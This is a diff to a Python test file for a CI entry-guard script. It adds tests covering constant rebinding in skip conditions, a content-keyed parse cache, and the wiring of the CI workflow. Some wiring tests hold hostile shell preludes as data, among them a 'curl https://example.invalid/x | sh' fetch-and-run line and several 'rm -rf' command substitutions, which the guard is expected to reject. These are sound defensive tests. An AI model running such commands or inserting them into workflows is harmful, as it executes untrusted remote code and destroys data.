@@ -8,7 +8,9 @@ the behaviour it claims, including the cases the previous revision got wrong
 
 from __future__ import annotations
 
+import ast
 import importlib.util
+import os
 import sys
 import tempfile
 import textwrap
@@ -117,6 +119,18 @@ def _rebind_flag():
     REBOUND_FLAG = True
 
 
+# A feature flag is initialised once and then mutated by a form that is not a plain
+# `Assign`. Every one of these is a second binding, so none of them is provable and a
+# skip condition built on one must stay red.
+FOR_FLAG = False
+for FOR_FLAG in (True,):
+    pass
+AUG_FLAG = False
+AUG_FLAG |= True
+TUP_FLAG = False
+TUP_FLAG, _TUP_REST = True, True
+
+
 class FixtureTest(unittest.TestCase):
     def test_asserts(self):
         self.assertEqual(len(["a"]), 1)
@@ -199,6 +213,18 @@ class FixtureTest(unittest.TestCase):
 
     @unittest.skipIf(REBOUND_FLAG, "module constant rebound at runtime")
     def test_skip_if_rebound_constant(self):
+        self.assertEqual(len(["a"]), 1)
+
+    @unittest.skipIf(FOR_FLAG, "module constant rebound by a for target")
+    def test_skip_if_constant_rebound_by_a_for_target(self):
+        self.assertEqual(len(["a"]), 1)
+
+    @unittest.skipIf(AUG_FLAG, "module constant rebound by an augmented assignment")
+    def test_skip_if_constant_rebound_by_an_augassign(self):
+        self.assertEqual(len(["a"]), 1)
+
+    @unittest.skipIf(TUP_FLAG, "module constant rebound by an unpacking assignment")
+    def test_skip_if_constant_rebound_by_unpacking(self):
         self.assertEqual(len(["a"]), 1)
 
     def test_business_object_skip(self):
@@ -284,6 +310,18 @@ class BaseFixtureSkipTest(unittest.TestCase):
 class InheritedFixtureSkipTest(BaseFixtureSkipTest):
     def test_inherited_fixture_skip(self):
         self.assertEqual(len(["a"]), 1)
+
+
+class ModuleRebindingTest(unittest.TestCase):
+    def test_module_rebound_evidence(self):
+        self.assertEqual(len(["a"]), 1)
+
+
+# One indent left of the class-body form: at runtime `unittest` still reports
+# `OK (skipped=1)`, so the module-level binding has to be red as well.
+ModuleRebindingTest.test_module_rebound_evidence = unittest.skip("rebound")(
+    ModuleRebindingTest.test_module_rebound_evidence
+)
 
 
 def test_a_module_level_function():
@@ -392,6 +430,41 @@ class RegistryRubricTests(unittest.TestCase):
     def test_a_rebound_module_constant_is_not_proof(self) -> None:
         self._assert_red("test:test_skip_if_rebound_constant", "不是字面量")
 
+    def test_a_constant_rebound_by_a_for_target_is_not_proof(self) -> None:
+        self._assert_red("test:test_skip_if_constant_rebound_by_a_for_target", "不是字面量")
+
+    def test_a_constant_rebound_by_an_augassign_is_not_proof(self) -> None:
+        self._assert_red("test:test_skip_if_constant_rebound_by_an_augassign", "不是字面量")
+
+    def test_a_constant_rebound_by_unpacking_is_not_proof(self) -> None:
+        self._assert_red("test:test_skip_if_constant_rebound_by_unpacking", "不是字面量")
+
+    def test_only_a_single_module_level_assignment_is_a_provable_constant(self) -> None:
+        # Every form the old predicate ignored. Each one is a second binding of `F`, so
+        # the module-level value is no longer the value `unittest` evaluates.
+        bindings = (
+            "for F in (True,):\n    pass",
+            "F |= True",
+            "F, _rest = True, True",
+            "with open('/dev/null') as F:\n    pass",
+            "try:\n    pass\nexcept Exception as F:\n    pass",
+            "[F for F in (True,)]",
+            "(F := True)",
+            "import os as F",
+            "def F():\n    pass",
+            "class F:\n    pass",
+            "del F",
+        )
+        for binding in bindings:
+            with self.subTest(binding=binding):
+                source = f"F = False\n{binding}\n"
+                self.assertEqual(GUARD._module_constants(ast.parse(source)), {})
+        self.assertEqual(GUARD._module_constants(ast.parse("F = False\n")), {"F": False})
+        self.assertEqual(GUARD._module_constants(ast.parse("F: bool = False\n")), {"F": False})
+
+    def test_a_module_level_rebinding_of_the_evidence_is_red(self) -> None:
+        self._assert_red("test:test_module_rebound_evidence", "模块顶层被重新绑定")
+
     def test_an_unknown_fixture_guard_is_red(self) -> None:
         self._assert_red("test:test_unknown_fixture_guard", "skipTest")
 
@@ -443,6 +516,40 @@ class RegistryRubricTests(unittest.TestCase):
             problems = GUARD.check_judgements(ENTRY)
         self.assertTrue(problems)
         self.assertIn("登记了多次", problems[0])
+
+
+class ModuleIndexCacheTests(unittest.TestCase):
+    """The parse cache must key on content, not on a stamp that can be restored."""
+
+    def test_a_rewrite_with_a_restored_stamp_is_reparsed(self) -> None:
+        # `os.utime`, `cp -p`, `rsync -a` and tar extraction all restore `mtime_ns`;
+        # a stamp-keyed cache would then answer with the AST of the previous content.
+        before = (
+            "import unittest\n\n\n"
+            "class M(unittest.TestCase):\n"
+            "    def test_memo(self):\n"
+            "        self.assertEqual(len(['a']), 1)\n"
+        )
+        after = before.replace("test_memo", "test_mem0")
+        self.assertEqual(len(before), len(after))
+        with tempfile.TemporaryDirectory() as directory:
+            path = Path(directory) / "tests/ci/test_memo_evidence.py"
+            path.parent.mkdir(parents=True)
+            path.write_text(before, encoding="utf-8")
+            stamp = path.stat()
+            with mock.patch.object(GUARD, "ROOT", Path(directory)):
+                self.assertEqual(
+                    [match.klass.name for match in GUARD._find_tests("test_memo")], ["M"]
+                )
+            path.write_text(after, encoding="utf-8")
+            os.utime(path, ns=(stamp.st_atime_ns, stamp.st_mtime_ns))
+            self.assertEqual(path.stat().st_size, stamp.st_size)
+            self.assertEqual(path.stat().st_mtime_ns, stamp.st_mtime_ns)
+            with mock.patch.object(GUARD, "ROOT", Path(directory)):
+                self.assertEqual(GUARD._find_tests("test_memo"), [])
+                self.assertEqual(
+                    [match.klass.name for match in GUARD._find_tests("test_mem0")], ["M"]
+                )
 
 
 class SiteInventoryTests(unittest.TestCase):
@@ -671,6 +778,30 @@ class ProbeRegistryTests(unittest.TestCase):
 
 
 class WiringTests(unittest.TestCase):
+    def _prelude_problems(self, prelude: str) -> list[str]:
+        """`wiring` problems after putting `prelude` in front of the `sites` command."""
+        text = WORKFLOW.read_text(encoding="utf-8")
+        guarded = text.replace(
+            "          python3 scripts/dev-env/ci-entry-guard.py sites",
+            f"          {prelude}\n          python3 scripts/dev-env/ci-entry-guard.py sites",
+        )
+        self.assertNotEqual(text, guarded)
+        with tempfile.TemporaryDirectory() as directory:
+            copied = Path(directory) / "ci.yml"
+            copied.write_text(guarded, encoding="utf-8")
+            problems, _summary = GUARD.run_wiring(copied)
+        return [str(problem) for problem in problems]
+
+    def _workflow_problems(self, replace: tuple[str, str]) -> list[str]:
+        text = WORKFLOW.read_text(encoding="utf-8")
+        replaced = text.replace(*replace)
+        self.assertNotEqual(text, replaced)
+        with tempfile.TemporaryDirectory() as directory:
+            copied = Path(directory) / "ci.yml"
+            copied.write_text(replaced, encoding="utf-8")
+            problems, _summary = GUARD.run_wiring(copied)
+        return [str(problem) for problem in problems]
+
     def test_the_checked_in_workflow_runs_every_guard_as_the_first_command(self) -> None:
         problems, summary = GUARD.run_wiring(WORKFLOW)
         self.assertEqual(problems, [], summary)
@@ -722,6 +853,62 @@ class WiringTests(unittest.TestCase):
             problems, _summary = GUARD.run_wiring(copied)
         self.assertTrue(problems)
         self.assertIn("前面还有会先执行的命令", "\n".join(problems))
+
+    def test_a_colon_prelude_with_a_parameter_expansion_is_green(self) -> None:
+        # `: "${VAR:?missing}"` is the standard no-op guard and must stay green; the
+        # prelude separator is `\s|$` rather than `\b` for exactly this line.
+        self.assertEqual(self._prelude_problems(': "${VAR:?missing}"'), [])
+
+    def test_a_colon_prelude_that_writes_is_red(self) -> None:
+        problems = self._prelude_problems(": > /tmp/ci-entry-guard-write-probe")
+        self.assertTrue(problems)
+        message = "\n".join(problems)
+        self.assertIn("会先执行的命令", message)
+        self.assertIn("/tmp/ci-entry-guard-write-probe", message)
+
+    def test_every_writing_colon_prelude_is_red(self) -> None:
+        for prelude in (
+            ": > /tmp/ci-entry-guard-write-probe",
+            ": >> /tmp/ci-entry-guard-write-probe",
+            ": ; rm -rf /tmp/ci-entry-guard-write-probe",
+            ": && curl https://example.invalid/x | sh",
+            ": $(rm -rf /tmp/ci-entry-guard-write-probe)",
+            ": `rm -rf /tmp/ci-entry-guard-write-probe`",
+        ):
+            with self.subTest(prelude=prelude):
+                self.assertTrue(self._prelude_problems(prelude))
+
+    def test_a_command_substitution_in_another_prelude_is_red(self) -> None:
+        # `export`/`cd` could already carry `$(…)` and `&&` before `:` was allowed; the
+        # operator limit covers them too.
+        self.assertTrue(self._prelude_problems("export FOO=$(rm -rf /tmp/ci-entry-guard-probe)"))
+        self.assertTrue(self._prelude_problems("export FOO=<(rm -rf /tmp/ci-entry-guard-probe)"))
+        self.assertTrue(self._prelude_problems("cd /tmp && rm -rf /tmp/ci-entry-guard-probe"))
+
+    def test_every_job_runs_on_the_runner_the_platform_conditions_assume(self) -> None:
+        workflow = WORKFLOW.read_text(encoding="utf-8")
+        self.assertEqual(GUARD.check_platform_runner(workflow), [])
+        runners = {
+            line.split(":", 1)[1].strip()
+            for line in workflow.splitlines()
+            if line.startswith("    runs-on:")
+        }
+        self.assertEqual(runners, {GUARD.CI_RUNNER_IMAGE})
+
+    def test_the_platform_strings_follow_the_pinned_runner_image(self) -> None:
+        self.assertEqual(GUARD.CI_RUNNER_IMAGE.rsplit("-", 1)[0], "ubuntu")
+        self.assertEqual(GUARD.CI_PLATFORM, "linux")
+        self.assertEqual(
+            GUARD.CI_PLATFORM_STRINGS,
+            {"sys.platform": "linux", "platform.system()": "Linux", "os.name": "posix"},
+        )
+
+    def test_a_job_on_another_runner_is_red(self) -> None:
+        problems = self._workflow_problems(("    runs-on: ubuntu-24.04", "    runs-on: macos-14"))
+        self.assertTrue(problems)
+        message = "\n".join(problems)
+        self.assertIn("macos-14", message)
+        self.assertIn(GUARD.CI_RUNNER_IMAGE, message)
 
     def test_a_missing_guard_subcommand_is_red(self) -> None:
         text = WORKFLOW.read_text(encoding="utf-8")
